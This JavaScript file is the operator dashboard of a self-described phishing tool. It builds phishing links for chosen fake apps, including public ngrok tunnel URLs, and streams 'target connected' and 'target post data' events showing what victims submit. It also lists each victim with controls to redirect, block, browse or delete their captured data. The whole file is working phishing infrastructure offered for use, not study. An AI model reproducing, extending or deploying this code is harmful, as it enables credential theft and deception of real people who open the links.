/**
 * 
 * @Author      : Madhan (Madhanmaaz) - madhan hacker
 * github       : https://github.com/madhanmaaz
 * website      : http://madhanmaaz.netlify.app/
 * Description  : Worlds No.1 Phishing Tool.
 * 
 */

const tools = document.querySelector("#tools")
const linkBtn = document.querySelector("#link-btn")
let configOpen = document.querySelector("#config-btn")
let configTab = document.querySelector(".config-tab")
let configTabClose = document.querySelector("#config-tab-close")
let configForm = document.querySelector(".config-tab form")
let dataBox = document.querySelector(".terminal-box")
let targetsBtn = document.querySelector("#targets-btn")
let targetsTab = document.querySelector(".targets-tab")
let targetsCloseBtn = document.querySelector("#targets-close-btn")
let delete_all_targets = document.querySelector("#delete-all-targets")

let selectedTool = tools.value

// socket function init
const socket = io("", {
    path: '/socket.io',
    transports: ['websocket'],
    secure: true,
})

tools.addEventListener("change", () => {
    selectedTool = tools.value
})

linkBtn.addEventListener("click", async () => {
    if (selectedTool == "none") {
        terminal("Select Tool", 1)
        return
    }

    let ngrok
    try {
        ngrok = await (await axios.get("/ngrok")).data
    } catch (error) {
        ngrok = "NGROK-ERROR"
    }

    const url = `${location.origin}/app/${selectedTool}`
    terminal(`App Name  : <b>${selectedTool}</b>`, 0)
    terminal(`URL       : <b>${url}</b>`, 0)
    terminal(`NGROK URL : <b>${ngrok}/app/${selectedTool}</b>`, 0)
})

configOpen.addEventListener("click", () => {
    axios.get(`/config`).then(res => {
        if (res.data == "ERROR") {
            terminal("config get error", 1)
            return
        }

        configTab.classList.add("active")
        let appconfig = res.data

        for (const key in appconfig) {
            let tag = document.querySelector(`.config-tab [name="${key}"]`)
            tag.value = appconfig[key]
        }
    }).catch(err => {
        console.log(err)
        terminal("config get error", 1)
    })
})

configForm.addEventListener("submit", (e) => {
    e.preventDefault()

    let data = {
        "redirects": {}
    }
    let tags = document.querySelectorAll(`.config-tab [name]`)
    tags.forEach(item => {
        if (item.getAttribute("data-redirects") == "true") {
            data["redirects"][item.name] = item.value
        } else {
            data[item.name] = item.value
        }
    })

    axios.post(`/config`, data, {
        headers: {
            'Content-Type': 'application/json'
        }
    }).then(res => {
        if (res.data == "ERROR") {
            terminal("config set error", 1)
            return
        }

        terminal("config set success.", 0)
    }).catch(err => {
        console.log(err)
        terminal("config set error", 1)
    })

    configTab.classList.remove("active")
})

configTabClose.addEventListener("click", () => {
    configTab.classList.remove("active")
})

function terminal(data, num = undefined) {
    let value = ""
    if (num == 1) {
        value = `<pre class="error"><span>$ </span>${data}</pre>`
    } else if (num == 0) {
        value = `<pre class="no-error"><span>$ </span>${data}</pre>`
    } else {
        value = `<pre><span>$ </span>${data}</pre>`
    }

    dataBox.innerHTML += value
    dataBox.scrollTop = dataBox.scrollHeight
}

socket.on("in-target-connected", data => {
    if (data == undefined) {
        data = {}
    }
    data["time"] = new Date()
    terminal(`Target Connected -> <b>${data.id}</b> :: <b>${data.appName}</b>

${terminalTable(data)}`)
})

socket.on("in-target-data", data => {
    if (data == undefined) {
        data = {}
    }
    data["server-time"] = new Date()
    terminal(`Target Post Data -> <b>${data.id}</b> :: <b>${data.appName}</b>

${terminalTable(data)}`)
})

function terminalTable(data) {
    let text = ''
    for (let a in data) {
        if (data[a] == '[object Object]') {
            let tText = ''
            for (let b in data[a]) {
                tText += `<li>${b} : ${data[a][b]}</li>`
            }
            text += `<tr><th>${a}</th><td>${tText}</td></tr>`
        } else {
            text += `<tr><th>${a}</th> <td>${data[a]}</td></tr>`
        }
    }
    return `<table>${text}</table>`
}

targetsBtn.addEventListener("click", async () => {
    targetsTab.classList.add("active")
    let dataReTab = document.querySelector(".targets-tab .content")
    dataReTab.innerHTML = ""
    try {
        let response = await axios.get("/get-targets")
        if (response.data.length == 0) {
            targetsTab.classList.remove("active")
            terminal("0 targets.", 1)
        }

        let index = 1
        for (let target of response.data) {
            const div = document.createElement("div")
            div.className = "item"

            div.innerHTML = `<p>${index}. ${target.appName} (${target.time}) - ${target.id}</p>
                <div class="btns" data-id="${target.id}">
                    <select>
                    ${target.status == "none" ? '<option value="none" selected disabled>none</option><option value="block">block</option><option value="redirect">redirect</option>' :
                    (target.status == "block" ? '<option value="block" selected>block</option><option value="redirect">redirect</option>'
                        : '<option value="block">block</option><option selected value="redirect">redirect</option>')}
                    </select>
                    <button class="btn browser" title="open data browser">
                        <i class="fa-brands fa-chrome"></i>
                    </button>
                    <a href="/db?id=${target.id}" target="_blank">
                        <button class="btn"><i class="fa-solid fa-database"></i></button>
                    </a>
                    <button class="btn delete" title="delete the target">
                        <i class="fa-solid fa-trash"></i>
                    </button>
                </div>`

            let redirectBtn = div.querySelector(".btns select")
            let dataBrowserBtn = div.querySelector(".btns .browser")
            let deleteTarget = div.querySelector(".btns .delete")

            redirectBtn.addEventListener("change", async () => {
                try {
                    await axios.get(`/set-targets?id=${target.id}&task=${redirectBtn.value}`)
                } catch (error) {
                    terminal("redirect error", 0)
                }
                targetsTab.classList.remove("active")
            })

            dataBrowserBtn.addEventListener("click", async () => {
                try {
                    await axios.get(`/set-targets?id=${target.id}&task=browser`)
                } catch (error) {
                    terminal("browser error", 0)
                }
                targetsTab.classList.remove("active")
            })

            deleteTarget.addEventListener("click", async () => {
                try {
                    if (confirm(`delete target ${target.id} ?`)) {
                        await axios.get(`/set-targets?id=${target.id}&task=delete`)
                    }
                } catch (error) {
                    terminal("delete error", 0)
                }
                targetsTab.classList.remove("active")
            })

            dataReTab.appendChild(div)
            index += 1
        }
    } catch (error) {
        console.log(error)
        terminal("ERR while getting targets", 1)
        targetsTab.classList.remove("active")
    }
})

targetsCloseBtn.addEventListener("click", () => {
    targetsTab.classList.remove("active")
})

delete_all_targets.addEventListener("click", async () => {
    if (confirm("delete all targets?")) {
        try {
            await axios.get(`/set-targets?id=none&task=delete-all`)
        } catch (error) {
            console.log(error)
            terminal("delete all error", 0)
        }
        targetsTab.classList.remove("active")
    }
})